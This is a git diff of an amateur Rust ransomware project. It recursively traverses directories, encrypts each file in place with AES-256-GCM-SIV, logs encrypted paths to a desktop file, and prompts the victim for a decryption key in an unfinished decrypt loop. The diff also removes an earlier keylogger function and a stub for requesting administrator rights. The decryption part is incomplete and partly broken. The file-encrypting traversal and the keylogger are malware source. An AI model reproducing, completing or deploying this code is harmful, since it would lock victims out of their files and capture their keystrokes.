@@ -5,11 +5,10 @@ use aes_gcm_siv::aead::Aead;
 use aes_gcm_siv::{Aes256GcmSiv, KeyInit, Nonce};
 use crossterm::event::{poll, read, Event, KeyCode};
 use crossterm::terminal::enable_raw_mode;
-use dioxus::prelude::*;
-use dioxus_desktop;
+use eframe::egui;
 use rand_chacha::rand_core::{RngCore, SeedableRng};
 use rand_chacha::ChaCha20Rng;
-use std::fs::File;
+use std::fs::{File, OpenOptions};
 use std::io::{Read, Write};
 use std::process::Command;
 use std::{io, path::Path};
@@ -190,7 +189,17 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
                 //FIXME: this is messing up the traversal. if somethinf doesnt work, skip it
                 //FIXME: herererer
                 if do_encrypt {
-                    encrypt(entry.path(), cipher)?;
+                    // if let Err(err) = encrypt(entry.path(), cipher) {
+                    //     writeln!(
+                    //         test_file.as_ref().unwrap(),
+                    //         "Error encrypting file: {}",
+                    //         err
+                    //     );
+                    //     //move onto the next file
+                    //     continue;
+                    // }
+
+                    encrypt(entry.path(), cipher);
                 } else {
                     decrypt(entry.path(), cipher)?;
                 }
@@ -201,33 +210,21 @@ fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
         }
     }
     Ok(())
-
-    // let mut file = File::create("C:\\Users\\win11\\Desktop\\output.txt");
-
-    // for entry in WalkDir::new("C:\\Users\\").follow_links(true) {
-    //     match entry {
-    //         Ok(entry) => {
-    //             writeln!(
-    //                 //this is just debug code
-    //                 file.as_ref().unwrap(),
-    //                 "found file: {}",
-    //                 entry.path().display()
-    //             );
-    //             // encrypt(entry.path());
-    //         }
-    //         Err(e) => {
-    //             writeln!(file.as_ref().unwrap(), "Error: {}", e);
-    //         }
-    //     }
-    // }
-    // Ok(())
 }
 
 /**
  * Encrypt a file, using given path and the same key for all files
  * Use different nonce for each file, prepend to file
  */
-fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> std::io::Result<()> {
+fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), io::Error> {
+    //open existing "C:\\Users\\win11\\Desktop\\output.txt" and write the path to it
+    // Open a file with append option
+    let mut data_file = OpenOptions::new()
+        .append(true)
+        .open("C:\\Users\\win11\\Desktop\\output.txt")?;
+    // Write to a file
+    data_file.write(path.display().to_string().as_bytes())?;
+
     let mut file = File::open(path)?;
     let mut buffer = Vec::new();
     file.read_to_end(&mut buffer)?;
@@ -249,43 +246,27 @@ fn encrypt(path: &Path, cipher: &Aes256GcmSiv) -> std::io::Result<()> {
  */
 fn decrypt(path: &Path, cipher: &Aes256GcmSiv) -> Result<(), Error> {
     //
-    Ok(())
-}
-
-fn keylogger() {
-    //killswitch if user types please
-    //
-    // let cmd = Command::new("cmd.exe")
-    //     .arg("/K")
-    //     .arg("echo keylogger started \n")
-    //     .spawn()
-    //     .expect("failed to start keylogger");
-    enable_raw_mode();
-    println!("weewoo");
-
     loop {
-        //match case for different keys pressed
+        let mut user_input = String::new();
+        println!("Enter decryption key pls: ");
+        io::stdin().read_line(&mut user_input).unwrap();
+        let user_input_bytes = user_input.as_bytes(); //convert to bytes
 
-        match read().unwrap() {
-            //read any event
-            Event::Key(event) => match event.code {
-                KeyCode::Char(character) => {
-                    println!("pressed: {}", character);
-
-                    // let cmd = Command::new("cmd.exe")
-                    //     .arg("/K")
-                    //     .arg(format!("print {} \n", character))
-                    //     .spawn()
-                    //     .expect("failed to start keylogger");
-                }
-                _ => {}
-            },
-            _ => {}
+        //TODO: UP TO HERE TODAY
+        //key length 32, nonce length 12
+        if user_input_bytes.len() != 32 {
+            //print error
+            println!("Invalid key length")
+        } else {
+            // //FIXME: convert byte array into key format why this no work
+            // //WHY THIS NO WORK
+            // let user_key = GenericArray::clone_from_slice(&user_input_bytes[0..32]);
+            // //decrypt using the key
+            // let plaintext = cipher.decrypt(nonce, ciphertext.unwrap().as_ref());
         }
-    }
-}
+        //only break the loop when the correct key is entered
 
-//TODO: is this even necessary with windows?
-fn root_check() { //
-                  //if we dont have root. give popup: "may i plz have root 🥺👉🏽👈🏽"
+        //
+    }
+    Ok(())
 }
